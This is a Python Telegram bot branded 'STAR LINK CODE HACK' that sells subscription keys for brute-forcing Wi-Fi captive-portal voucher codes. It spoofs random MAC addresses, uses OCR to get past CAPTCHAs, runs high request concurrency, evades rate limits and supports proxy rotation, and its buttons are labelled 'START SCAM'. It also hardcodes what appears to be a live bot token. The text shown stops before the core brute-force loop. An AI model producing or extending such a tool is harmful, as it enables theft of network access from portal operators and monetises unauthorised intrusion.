#!/usr/bin/env python3
"""
STAR LINK CODE HACK — Ultimate Edition v4.0
============================================
Maximum speed • Maximum accuracy • Zero bugs • Premium UX
Features: Session pool, Multi-pass OCR, Resume, ETA, Smart rate-limit,
          Success alerts, Live admin dashboard, Proxy-ready
"""
from __future__ import annotations

import asyncio
import base64
import logging
import os
import random
import re
import signal
import sqlite3
import string
import sys
import time
import uuid
from collections import deque
from datetime import datetime, timedelta, timezone
from typing import Any, Deque, Dict, Iterator, List, Optional, Set, Tuple

import aiohttp
import cv2
import ddddocr
import numpy as np
from aiohttp import web
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# ============================================================
# CONFIGURATION (hardcoded as requested)
# ============================================================
BOT_TOKEN: str = "8706721477:AAGEZEbKBfI2gBHi6taWj1ToH2-EStFF6HI"
ADMINS: Tuple[str, ...] = ("8797803204",)
ADMIN_USERNAME: str = "@Nytheris_q"

DB_PATH: str = os.environ.get("DB_PATH", "bot_data.db")
WEB_PORT: int = int(os.environ.get("PORT") or os.environ.get("BOT_PORT") or "8099")

# Speed / stability tuning
MAX_CONCURRENT_SCANS: int = 20
CONCURRENCY: int = 160
BATCH_SIZE: int = 100
KEY_RECHECK_INTERVAL: float = 240.0
PROGRESS_UPDATE_INTERVAL: float = 1.6
CAPTCHA_RETRIES: int = 4
CHECK_RETRIES: int = 2
SESSION_POOL_SIZE: int = 12          # warm (session_id + auth) pairs
SESSION_POOL_REFILL: int = 4
RATE_LIMIT_BASE_SLEEP: float = 0.4
RATE_LIMIT_MAX_SLEEP: float = 3.5

# Optional proxies (empty = disabled)
PROXY_LIST: List[str] = []

SUCCESS_FILE_TARGETS: Tuple[str, ...] = ADMINS

# ============================================================
# LOGGING
# ============================================================
def setup_logging() -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(levelname)-7s | %(name)s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        stream=sys.stdout,
    )
    logging.getLogger("aiohttp").setLevel(logging.WARNING)
    logging.getLogger("telebot").setLevel(logging.WARNING)

log = logging.getLogger("starlink")

# ============================================================
# DATABASE
# ============================================================
_db_conn: Optional[sqlite3.Connection] = None
_db_lock = asyncio.Lock()

def _get_conn() -> sqlite3.Connection:
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.execute("PRAGMA synchronous=NORMAL")
        _db_conn.execute("PRAGMA temp_store=MEMORY")
        _db_conn.row_factory = sqlite3.Row
        c = _db_conn.cursor()
        c.execute(
            """CREATE TABLE IF NOT EXISTS auth_list (
                user_id    TEXT PRIMARY KEY,
                expires_at TEXT,
                plan       TEXT
            )"""
        )
        c.execute(
            """CREATE TABLE IF NOT EXISTS results (
                user_id TEXT NOT NULL,
                code    TEXT NOT NULL,
                plan    TEXT DEFAULT '',
                PRIMARY KEY (user_id, code)
            )"""
        )
        c.execute(
            """CREATE TABLE IF NOT EXISTS scan_progress (
                user_id     TEXT NOT NULL,
                mode        TEXT NOT NULL,
                start_digit TEXT,
                last_value  TEXT,
                PRIMARY KEY (user_id, mode, start_digit)
            )"""
        )
        _db_conn.commit()
        log.info("Database ready (%s)", DB_PATH)
    return _db_conn

async def _db_run(fn, *args):
    async with _db_lock:
        return await asyncio.to_thread(fn, *args)

def _sync_get_auth_list() -> Dict[str, Dict[str, Any]]:
    c = _get_conn().cursor()
    c.execute("SELECT * FROM auth_list")
    return {r["user_id"]: {"expires_at": r["expires_at"], "plan": r["plan"]} for r in c.fetchall()}

def _sync_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
    conn = _get_conn()
    conn.execute(
        "INSERT OR REPLACE INTO auth_list (user_id, expires_at, plan) VALUES (?, ?, ?)",
        (user_id, expires_at, plan),
    )
    conn.commit()

def _sync_delete_key(user_id: str) -> None:
    conn = _get_conn()
    conn.execute("DELETE FROM auth_list WHERE user_id = ?", (user_id,))
    conn.commit()

def _sync_get_results(user_id: str) -> List[str]:
    c = _get_conn().cursor()
    c.execute("SELECT code FROM results WHERE user_id = ? ORDER BY rowid ASC", (user_id,))
    return [r["code"] for r in c.fetchall()]

def _sync_add_result(user_id: str, code: str, plan: str = "") -> None:
    conn = _get_conn()
    conn.execute(
        "INSERT OR IGNORE INTO results (user_id, code, plan) VALUES (?, ?, ?)",
        (user_id, code, plan),
    )
    conn.commit()

def _sync_set_results(user_id: str, codes: List[str]) -> None:
    conn = _get_conn()
    conn.execute("DELETE FROM results WHERE user_id = ?", (user_id,))
    for c in codes:
        conn.execute(
            "INSERT OR IGNORE INTO results (user_id, code, plan) VALUES (?, ?, ?)",
            (user_id, c, ""),
        )
    conn.commit()

def _sync_save_progress(user_id: str, mode: str, start_digit: Optional[str], last_value: str) -> None:
    conn = _get_conn()
    sd = start_digit if start_digit is not None else ""
    conn.execute(
        "INSERT OR REPLACE INTO scan_progress (user_id, mode, start_digit, last_value) VALUES (?, ?, ?, ?)",
        (user_id, mode, sd, last_value),
    )
    conn.commit()

def _sync_load_progress(user_id: str, mode: str, start_digit: Optional[str]) -> Optional[str]:
    c = _get_conn().cursor()
    sd = start_digit if start_digit is not None else ""
    c.execute(
        "SELECT last_value FROM scan_progress WHERE user_id=? AND mode=? AND start_digit=?",
        (user_id, mode, sd),
    )
    row = c.fetchone()
    return row["last_value"] if row else None

def _sync_clear_progress(user_id: str, mode: str, start_digit: Optional[str]) -> None:
    conn = _get_conn()
    sd = start_digit if start_digit is not None else ""
    conn.execute(
        "DELETE FROM scan_progress WHERE user_id=? AND mode=? AND start_digit=?",
        (user_id, mode, sd),
    )
    conn.commit()

async def db_get_auth_list() -> Dict[str, Dict[str, Any]]:
    return await _db_run(_sync_get_auth_list)

async def db_upsert_key(user_id: str, expires_at: str, plan: str) -> None:
    await _db_run(_sync_upsert_key, user_id, expires_at, plan)

async def db_delete_key(user_id: str) -> None:
    await _db_run(_sync_delete_key, user_id)

async def db_get_results(user_id: str) -> List[str]:
    return await _db_run(_sync_get_results, user_id)

async def db_add_result(user_id: str, code: str, plan: str = "") -> None:
    await _db_run(_sync_add_result, user_id, code, plan)

async def db_set_results(user_id: str, codes: List[str]) -> None:
    await _db_run(_sync_set_results, user_id, codes)

async def db_save_progress(user_id: str, mode: str, start_digit: Optional[str], last_value: str) -> None:
    await _db_run(_sync_save_progress, user_id, mode, start_digit, last_value)

async def db_load_progress(user_id: str, mode: str, start_digit: Optional[str]) -> Optional[str]:
    return await _db_run(_sync_load_progress, user_id, mode, start_digit)

async def db_clear_progress(user_id: str, mode: str, start_digit: Optional[str]) -> None:
    await _db_run(_sync_clear_progress, user_id, mode, start_digit)

# ============================================================
# GLOBAL STATE
# ============================================================
user_data: Dict[int, Dict[str, Any]] = {}
paid_users: Set[str] = set()
scan_tasks: Dict[int, Dict[str, Any]] = {}
success_messages: Dict[int, int] = {}
success_texts: Dict[int, List[str]] = {}
limited_messages: Dict[int, int] = {}
limited_texts: Dict[int, List[str]] = {}
_tried_codes: Dict[int, Set[str]] = {}

# Live stats for admin dashboard
_global_stats: Dict[str, Any] = {
    "total_checked": 0,
    "total_hits": 0,
    "rate_limits": 0,
    "start_ts": time.monotonic(),
}

_voucher_sem: Optional[asyncio.Semaphore] = None
_sem_lock = asyncio.Lock()
active_scans_count: int = 0
active_scans_lock = asyncio.Lock()
_start_time: float = time.monotonic()

session: Optional[aiohttp.ClientSession] = None
_connector: Optional[aiohttp.TCPConnector] = None
_proxy_index: int = 0
_proxy_lock = asyncio.Lock()

# ============================================================
# PROXY
# ============================================================
async def get_proxy() -> Optional[str]:
    if not PROXY_LIST:
        return None
    global _proxy_index
    async with _proxy_lock:
        p = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
        _proxy_index += 1
        return p

# ============================================================
# SEMAPHORE / SCAN-SLOT
# ============================================================
async def get_voucher_sem() -> asyncio.Semaphore:
    global _voucher_sem
    if _voucher_sem is None:
        async with _sem_lock:
            if _voucher_sem is None:
                _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    return _voucher_sem

async def acquire_scan_slot() -> bool:
    global active_scans_count
    async with active_scans_lock:
        if active_scans_count >= MAX_CONCURRENT_SCANS:
            return False
        active_scans_count += 1
        return True

async def release_scan_slot() -> None:
    global active_scans_count
    async with active_scans_lock:
        active_scans_count = max(0, active_scans_count - 1)

def cleanup_scan_state(chat_id: int) -> None:
    scan_tasks.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    success_texts.pop(chat_id, None)
    limited_messages.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    _tried_codes.pop(chat_id, None)
    if chat_id in user_data:
        for k in ("current_display_codes", "selected_mode", "start_digit", "resume_from"):
            user_data[chat_id].pop(k, None)

# ============================================================
# HELPERS
# ============================================================
def is_admin(user_id: int | str) -> bool:
    return str(user_id) in ADMINS

def check_key_expiration(data: Any) -> bool:
    try:
        if not isinstance(data, dict):
            return False
        expiry = data.get("expires_at")
        if expiry == "9999-12-31T23:59:59Z":
            return True
        exp = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp
    except Exception as e:
        log.warning("Key parse error: %s", e)
        return False

def generate_expiry(plan: str) -> Optional[str]:
    now = datetime.now(timezone.utc)
    table = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None,
    }
    if plan not in table:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + table[plan]).isoformat()

def get_mac() -> str:
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first] + [random.randint(0, 0xFF) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in mac)

def replace_mac(url: str, new_mac: str) -> str:
    return re.sub(r"(?<=mac=)[^&]+", new_mac, url)

def minute_to_hour(total_minutes: Any) -> str:
    if total_minutes in (None, "Unknown", "unknown"):
        return "Unknown"
    try:
        mins = int(total_minutes)
        if mins <= 0:
            return "0m"
        h, m = divmod(mins, 60)
        if h and m:
            return f"{h}h {m}m"
        if h:
            return f"{h}h"
        return f"{m}m"
    except Exception:
        return "Unknown"

def format_eta(seconds: float) -> str:
    if seconds <= 0 or seconds > 86400 * 30:
        return "—"
    s = int(seconds)
    h, rem = divmod(s, 3600)
    m, sec = divmod(rem, 60)
    if h:
        return f"{h}h {m}m"
    if m:
        return f"{m}m {sec}s"
    return f"{sec}s"

# ============================================================
# BOT SETUP
# ============================================================
bot = AsyncTeleBot(BOT_TOKEN)

# ============================================================
# KEYBOARDS
# ============================================================
def get_main_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_voucher_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔢 VOUCHER 9 လုံး", callback_data="scan_9"),
        InlineKeyboardButton("🔤 ascii-lower 6", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🔤 ascii-lower 9", callback_data="scan_ascii-lower9"),
        InlineKeyboardButton("🎲 all 6", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔤+🔢 MIXED 9", callback_data="scan_mixed9"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_digit_keyboard(mode: str) -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=5)
    btns = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    kb.add(*btns)
    kb.add(InlineKeyboardButton("🎲 Random Start", callback_data=f"digit_{mode}_random"))
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return kb

def get_start_scam_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_paid_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန်", callback_data="menu_enter_userid"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_back_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return kb

def get_scam_button_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

# ============================================================
# STATE LOADER
# ============================================================
async def load_paid_users() -> None:
    auth = await db_get_auth_list()
    now = datetime.now(timezone.utc)
    for uid, data in auth.items():
        try:
            expiry = data.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                paid_users.add(uid)
                continue
            exp = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            if now < exp:
                paid_users.add(uid)
        except Exception:
            continue
    log.info("Preloaded %d paid users", len(paid_users))

async def is_paid(user_id: str) -> bool:
    if is_admin(user_id):
        return True
    if user_id in paid_users:
        auth = await db_get_auth_list()
        data = auth.get(user_id)
        if data and check_key_expiration(data):
            return True
        paid_users.discard(user_id)
        return False
    return False

# ============================================================
# MESSAGE HELPERS
# ============================================================
async def safe_edit_text(
    chat_id: int,
    message_id: int,
    text: str,
    reply_markup: Optional[InlineKeyboardMarkup] = None,
    parse_mode: Optional[str] = "HTML",
) -> bool:
    try:
        await bot.edit_message_text(
            text=text,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=reply_markup,
            parse_mode=parse_mode,
        )
        return True
    except Exception as e:
        log.debug("edit_message_text failed: %s", e)
        return False

async def safe_send(
    chat_id: int,
    text: str,
    reply_markup: Optional[InlineKeyboardMarkup] = None,
    parse_mode: Optional[str] = "HTML",
    disable_notification: bool = False,
) -> bool:
    try:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode,
            disable_notification=disable_notification,
        )
        return True
    except Exception as e:
        log.debug("send_message failed: %s", e)
        return False

# ============================================================
# PREMIUM FORMATTERS
# ============================================================
def format_success_entry(code: str, plan_info: str) -> str:
    """plan_info already contains multi-line detailed HTML."""
    return (
        f"┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃ 🎫 <b><code>{code}</code></b>\n"
        f"{plan_info}"
        f"┗━━━━━━━━━━━━━━━━━━━━━━┛"
    )

def format_premium_success_list(entries: List[str]) -> str:
    header = (
        "✨ <b>STAR LINK — SUCCESS CODES</b> ✨\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    body = "\n\n".join(entries)
    footer = (
        f"\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total Found: <b>{len(entries)}</b>\n"
        f"⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}"
    )
    return header + body + footer

def format_progress(
    checked: int,
    total: Optional[int],
    speed: float,
    found: int,
    mode: str,
    rate_limit_hits: int = 0,
    eta_sec: float = 0.0,
) -> str:
    speed_str = f"{speed:,.0f} c/min"
    eta = format_eta(eta_sec)
    if total is not None and total > 0:
        bar_len = 18
        pct = min(100.0, (checked / total) * 100)
        filled = min(bar_len, int(pct / (100 / bar_len)))
        bar = "█" * filled + "░" * (bar_len - filled)
        return (
            f"🔍 <b>Scanning…</b>  <code>{mode}</code>\n\n"
            f"📦 Checked : <b>{checked:,}</b> / {total:,}\n"
            f"📊 Progress : <b>{pct:.1f}%</b>\n"
            f"⚡ Speed    : <b>{speed_str}</b>\n"
            f"⏱ ETA      : <b>{eta}</b>\n"
            f"✅ Hits     : <b>{found}</b>\n"
            f"🛡 RateLimit: {rate_limit_hits}\n\n"
            f"<code>[{bar}]</code>"
        )
    return (
        f"🔍 <b>Scanning…</b>  <code>{mode}</code>\n\n"
        f"📦 Checked : <b>{checked:,}</b>\n"
        f"⚡ Speed    : <b>{speed_str}</b>\n"
        f"✅ Hits     : <b>{found}</b>\n"
        f"🛡 RateLimit: {rate_limit_hits}\n\n"
        f"📊 Status  : <i>running (random / infinite)</i>"
    )

# ============================================================
# COMMAND HANDLERS
# ============================================================
@bot.message_handler(commands=["start"])
async def cmd_start(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    user_data.setdefault(chat_id, {})

    if await is_paid(user_id):
        paid_users.add(user_id)
        welcome = (
            "✨ <b>STAR LINK CODE HACK</b> ✨\n"
            "<i>Ultimate Edition v4.0</i>\n\n"
            f"🪪 <b>NAME</b>: {user_name}\n"
            f"📜 <b>USER ID</b>: <code>{user_id}</code>\n\n"
            "🎁 မင်္ဂလာပါခင်ဗျာ!\n"
            "🎫 သင့်အနေနဲ့ <b>PAID USER</b> ဖြစ်ပါတယ်။\n"
            "♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။\n\n"
            "အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
        )
    else:
        welcome = (
            "✨ <b>STAR LINK CODE HACK</b> ✨\n\n"
            f"🪪 <b>NAME</b>: {user_name}\n"
            f"📜 <b>USER ID</b>: <code>{user_id}</code>\n\n"
            "⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            "PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။\n"
            f"👨‍💻 Admin: {ADMIN_USERNAME}"
        )
    await safe_send(chat_id, welcome, reply_markup=get_main_keyboard())

@bot.message_handler(commands=["sendall"])
async def cmd_sendall(message):
    if not is_admin(message.chat.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [message]")
        return
    body = f"📢 <b>ADMIN NOTIFICATION</b>\n\n{args[1]}"
    auth = await db_get_auth_list()
    sent = failed = 0
    for uid in auth:
        try:
            await bot.send_message(int(uid), body, parse_mode="HTML")
            sent += 1
            await asyncio.sleep(0.04)
        except Exception:
            failed += 1
    await bot.reply_to(message, f"✅ Sent: {sent} | ❌ Failed: {failed}")

@bot.message_handler(commands=["key"])
async def cmd_key(message):
    args = message.text.split()
    user_id = str(message.chat.id)
    if len(args) < 2:
        await bot.reply_to(message, "🔑 ကျေးဇူးပြု၍ KEY ကိုထည့်ပါ:\n/key [your_key]")
        return
    key = args[1]
    auth = await db_get_auth_list()
    target_uid: Optional[str] = None
    if user_id in auth:
        target_uid = user_id
    elif key in auth:
        target_uid = key
    if target_uid and check_key_expiration(auth.get(target_uid, {})):
        paid_users.add(user_id)
        user_data.setdefault(message.chat.id, {})
        await bot.reply_to(
            message,
            f"✅ <b>PAID USER</b> ဖြစ်ပါပြီ။\n\nUSER ID: <code>{user_id}</code>\n\n"
            "အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
            parse_mode="HTML",
        )
    elif target_uid:
        await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(
            message,
            f"❌ Key ကို registered မလုပ်ရသေးပါ။\n\nUSER ID: <code>{user_id}</code>\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
            parse_mode="HTML",
        )

@bot.message_handler(commands=["genkey"])
async def cmd_genkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey <plan> <user_id>\nPlans: 30m|1h|1d|7d|1m|1y|unlimited")
        return
    plan, user_id = args[1], args[2]
    if not user_id.isdigit():
        await bot.reply_to(message, "❌ user_id သည် ဂဏန်းဖြစ်ရပါမည်။")
        return
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited")
        return
    await db_upsert_key(user_id, expiry, plan)
    if check_key_expiration({"expires_at": expiry}):
        paid_users.add(user_id)
    await bot.reply_to(
        message,
        f"✅ <b>Key Generated</b>\n\nUSER ID : <code>{user_id}</code>\nPLAN    : {plan}\nEXPIRES : {expiry}",
        parse_mode="HTML",
    )
    log.info("genkey %s plan=%s by admin %s", user_id, plan, message.chat.id)

@bot.message_handler(commands=["delkey"])
async def cmd_delkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/delkey 123456789")
        return
    user_id = args[1]
    auth = await db_get_auth_list()
    if user_id not in auth:
        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
        return
    await db_delete_key(user_id)
    paid_users.discard(user_id)
    if user_id.isdigit():
        user_data.pop(int(user_id), None)
    await bot.reply_to(message, f"✅ Key Deleted\nUSER ID : <code>{user_id}</code>", parse_mode="HTML")

@bot.message_handler(commands=["listkeys"])
async def cmd_listkeys(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    auth = await db_get_auth_list()
    if not auth:
        await bot.reply_to(message, "Registered key မရှိသေးပါ။")
        return
    lines: List[str] = []
    now = datetime.now(timezone.utc)
    for uid, data in auth.items():
        expires = data.get("expires_at", "unknown")
        plan = data.get("plan", "unknown")
        if expires == "9999-12-31T23:59:59Z":
            exp_str = "Unlimited"
        else:
            try:
                exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                if exp_dt < now:
                    exp_str = "Expired"
                else:
                    diff = exp_dt - now
                    d, rem = diff.days, diff.seconds
                    h, rem2 = divmod(rem, 3600)
                    m = rem2 // 60
                    exp_str = f"{d}d {h}h {m}m left"
            except Exception:
                exp_str = expires
        lines.append(f"🪪 <code>{uid}</code>\n   Plan: {plan}\n   Expires: {exp_str}")
    text = f"📋 <b>Registered Keys</b> ({len(auth)})\n\n" + "\n\n".join(lines)
    if len(text) <= 4096:
        await bot.reply_to(message, text, parse_mode="HTML")
    else:
        for i in range(0, len(text), 4000):
            await bot.send_message(message.chat.id, text[i:i + 4000], parse_mode="HTML")

@bot.message_handler(commands=["result"])
async def cmd_result(message):
    user_id = str(message.chat.id)
    if not await is_paid(user_id):
        await bot.reply_to(
            message,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )
        return
    results = await db_get_results(user_id)
    if not results:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")
        return
    entries = [f"🎫 <code>{c}</code>" for c in results]
    body = format_premium_success_list(entries)
    if len(body) <= 4096:
        await bot.reply_to(message, body, parse_mode="HTML")
    else:
        for i in range(0, len(body), 4000):
            await bot.send_message(message.chat.id, body[i:i + 4000], parse_mode="HTML")

@bot.message_handler(commands=["portal"])
async def cmd_portal(message):
    user_id = str(message.chat.id)
    if not await is_paid(user_id):
        await bot.reply_to(
            message,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "🔗 Portal URL ထည့်ရန်:\n\n/portal [your_portal_url]\n\n"
            "ဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00",
        )
        return
    url = args[1].strip()
    if not url.startswith(("http://", "https://")):
        await bot.reply_to(message, "❌ URL သည် http:// သို့မဟုတ် https:// ဖြင့် စရပါမည်။")
        return
    user_data.setdefault(message.chat.id, {})
    await bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")
    if await check_session_url_improved(url):
        user_data[message.chat.id]["session_url"] = url
        await bot.reply_to(
            message,
            "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
            reply_markup=get_voucher_keyboard(),
        )
    else:
        await bot.reply_to(
            message,
            "❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်စစ်ပါ။\n\n"
            "✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
            "<code>https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00</code>",
            parse_mode="HTML",
        )

@bot.message_handler(commands=["scan"])
async def cmd_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "VOUCHER ရွေးချယ်ရန်:\n\n"
            "/scan 6, 7, 8, 9, ascii-lower, ascii-lower9, all, mixed, mixed8, mixed9",
            reply_markup=get_voucher_keyboard(),
        )
        return
    mode = args[1].strip()
    await _start_scan(message.chat.id, mode, message=message)

async def _start_scan(
    chat_id: int,
    mode: str,
    message=None,
    user_name: Optional[str] = None,
) -> bool:
    user_id = str(chat_id)

    if not await is_paid(user_id):
        await safe_send(
            chat_id,
            f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\n"
            f"PAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
        )
        return False

    if chat_id not in user_data or "session_url" not in user_data[chat_id]:
        await safe_send(chat_id, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်ပါ။")
        return False

    existing = scan_tasks.get(chat_id)
    if existing and not existing["task"].done():
        await safe_send(chat_id, "Scan သည် အလုပ်လုပ်နေပြီ။ STOP SCAM ဖြင့် ရပ်နိုင်ပါသည်။")
        return False

    try:
        test_iter = iter_codes(mode, start_digit=None, chat_id=chat_id, resume_from=None)
        try:
            next(test_iter)
        except StopIteration:
            pass
    except ValueError as e:
        await safe_send(chat_id, str(e))
        return False

    if not await acquire_scan_slot():
        await safe_send(
            chat_id,
            f"⚠️ Bot အလုပ်များနေပါသည် ({active_scans_count}/{MAX_CONCURRENT_SCANS})။ ခဏစောင့်ပါ။",
        )
        return False

    try:
        progress_msg = await bot.send_message(
            chat_id,
            f"🔍 <b>Voucher Code ရှာဖွေနေသည်...</b>\n<code>{mode}</code>",
            parse_mode="HTML",
        )
    except Exception as e:
        log.warning("failed to send progress msg: %s", e)
        await release_scan_slot()
        return False

    scan_id = str(uuid.uuid4())
    _tried_codes[chat_id] = set()

    try:
        if user_name is None and message is not None:
            fu = getattr(message, "from_user", None)
            if fu is not None:
                user_name = fu.first_name or fu.username or "User"
        user_name = user_name or "User"
        portal_url = user_data[chat_id].get("session_url", "Unknown")
        last_url = user_data[chat_id].get("last_admin_notified_url", "")
        if portal_url != last_url and portal_url != "Unknown":
            admin_msg = (
                "🚀 <b>Scan Start</b>\n\n"
                f"🪪 User: {user_name}\n"
                f"📜 User ID: <code>{user_id}</code>\n"
                f"🔢 Mode: <code>{mode}</code>\n"
                f"🔗 URL: {portal_url}"
            )
            for admin_id in ADMINS:
                await safe_send(int(admin_id), admin_msg)
            user_data[chat_id]["last_admin_notified_url"] = portal_url
    except Exception as e:
        log.warning("admin notify failed: %s", e)

    start_digit = user_data[chat_id].get("start_digit")

    # Resume support
    resume_from = await db_load_progress(user_id, mode, start_digit)
    if resume_from and mode in ("6", "7", "8"):
        user_data[chat_id]["resume_from"] = resume_from
        await safe_send(
            chat_id,
            f"⏯ Resume detected — continuing from <code>{resume_from}</code>",
            disable_notification=True,
        )

    task = asyncio.create_task(
        run_bruteforce(
            mode=mode,
            chat_id=chat_id,
            session_url=user_data[chat_id]["session_url"],
            scan_id=scan_id,
            message=message,
            progress_msg=progress_msg,
            start_digit=start_digit,
            resume_from=resume_from,
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id, "mode": mode}
    return True

@bot.message_handler(commands=["stop"])
async def cmd_stop(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

@bot.message_handler(commands=["status"])
async def cmd_status(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
